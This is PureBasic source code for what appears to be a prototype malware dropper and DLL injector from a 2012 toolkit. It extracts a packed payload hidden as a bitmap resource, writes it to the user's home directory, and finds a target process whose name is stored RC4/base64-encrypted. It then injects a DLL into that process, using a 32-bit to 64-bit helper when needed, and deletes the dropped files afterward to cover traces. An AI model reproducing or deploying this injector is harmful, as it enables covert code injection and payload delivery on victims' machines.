; ***************************************************************************
; *                                                                         *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; * License:     BSD License                                                *
; * Copyright:   (c) 2012, a12d404.net                                      *
; * Status:      Prototype                                                  *
; *                                                                         *
; ***************************************************************************
EnableExplicit


XIncludeFile("filesystem/pefile.pbi")
XIncludeFile("security/rc4_crypto.pbi")
XIncludeFile("processes/processes.pbi")
XIncludeFile("include/inc_injector.pbi")

; ---------------------------------------------------------------------------
;- Consts


; ---------------------------------------------------------------------------
;- Types


; ---------------------------------------------------------------------------
;- Prototypes


; ---------------------------------------------------------------------------
;- Variables
Global checksum.s
Global homeDir.s
Global packedPayloadFilename.s

Global *payload
Global payloadSize.i = 0
Global targetProcessPid.l = 0
Global is32.b = #False

; ---------------------------------------------------------------------------
;- Procedures

; ***************************************************************************
; * Sample -- Does nothing ... really!                                      *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
;Procedure.b Sample(param.l)
;   Define res.b
;   
; SampleCleanup:
;   
;   ProcedureReturn res
; SampleError:
;   res = #False
;   Goto SampleCleanup
;EndProcedure

; ---------------------------------------------------------------------------

; ***************************************************************************
; * GoInject --                                                             *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure GoInject(pidForInjection.l)
  Define res.b = #False
  
  Define localFileName.s = homeDir + checksum + ".dll"
  
  If pidForInjection = 0
    Goto GoInjectCleanup
  EndIf
  
  If InjectDll(localFileName, pidForInjection)
    WaitForProcess(pidForInjection)
  EndIf
  
GoInjectCleanup:
  DeleteFile(localFileName)
EndProcedure

; ***************************************************************************
; * Main *
; ********

checksum = ResourceLoadString(#RES_STR_LOCAL_FILE_NAME)
homeDir = GetHomeDirectory()
packedPayloadFilename = homeDir + checksum + ".bin"

CompilerSelect #PB_Compiler_Processor
  CompilerCase #PB_Processor_x86
    ; ***************************************************************************
    ; * GoInject --                                                             *
    ; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
    ; ***************************************************************************
    Procedure Go64bit()
      Define res.b = #False
      
      Define localFileName.s = homeDir + checksum
      
      ; extract 64bit exe+dll
      If Not OpenPack(packedPayloadFilename)
        End 1
      EndIf
      ; skip 32bit stuff
      NextPackFile()
      
      ; EXE
      *payload = NextPackFile()
      payloadSize = PackFileSize()
      StreamToFile(localFileName + ".exe", *payload, payloadSize)
      
      ; DLL
      *payload = NextPackFile()
      payloadSize = PackFileSize()
      StreamToFile(localFileName + ".dll", *payload, payloadSize)
      ClosePack()
      
      RunProgram(localFileName, "", homeDir, #PB_Program_Wait)
      
    Go64bitCleanup:
      DeleteFile(localFileName + ".exe")
      DeleteFile(localFileName + ".dll")
    EndProcedure
    
    ; get size of packed payload
    payloadSize = ResourceSize(#RES_PAYLOAD, #RT_BITMAP)
    *payload = AllocateMemory(payloadSize)
    If Not *payload
      End 1
    EndIf
    
    ; allocate memory for packed payload
    If Not ResourceLoadData(*payload, payloadSize, #RES_PAYLOAD, #RT_BITMAP)
      End 1
    EndIf
    
    If Not StreamToFile(packedPayloadFilename, *payload, payloadSize)
      End 1
    EndIf
    FreeMemory(*payload)
    payloadSize = 0
    
    targetProcessPid = GetPidByName(rc4_base64_decrypt(@checkSum, StringByteLength(checkSum), ResourceLoadString(#RES_STR_TARGET_PROCESS)))
    If targetProcessPid = 0
      DeleteFile(packedPayloadFilename)
      End 1
    EndIf
    
    MessageRequester("injector", "before IsProcess32bit -> " + Str(@is32))
    If Not IsProcess32bit(targetProcessPid, @is32)
      DeleteFile(packedPayloadFilename)
      End 1
    EndIf
    
    MessageRequester("injector", "after IsProcess32bit")
    
    If Not is32
      ; User 64bit injection
      Go64bit()
    Else
      ; 32bit process found
      
      ; extract 32bit dll
      If Not OpenPack(packedPayloadFilename)
        End 1
      EndIf
      *payload = NextPackFile()
      payloadSize = PackFileSize()
      StreamToFile(homeDir + checksum + ".dll", *payload, payloadSize)
      ClosePack()
      
      GoInject(targetProcessPid)
    EndIf
    
    DeleteFile(packedPayloadFilename)
  CompilerCase #PB_Processor_x64
    targetProcessPid = GetPidByName(rc4_base64_decrypt(@checkSum, StringByteLength(checkSum), ResourceLoadString(#RES_STR_TARGET_PROCESS)))
    
    If targetProcessPid = 0
      End 1
    EndIf
    
    If Not IsProcess32bit(targetProcessPid, @is32)
      End 1
    EndIf
    
    If is32
      End 1
    EndIf
    
    If targetProcessPid > 0
      ; 64bit process found
      
      GoInject(targetProcessPid)
    EndIf
  CompilerDefault
    CompilerError "Target processor not supported!"
CompilerEndSelect

; IDE Options = PureBasic 4.60 Beta 3 (Windows - x64)
; CursorPosition = 153
; FirstLine = 83
; Folding = 0
; EnableXP
; EnablePurifier
; EnableCompileCount = 0
; EnableBuildCount = 0
; EnableExeConstant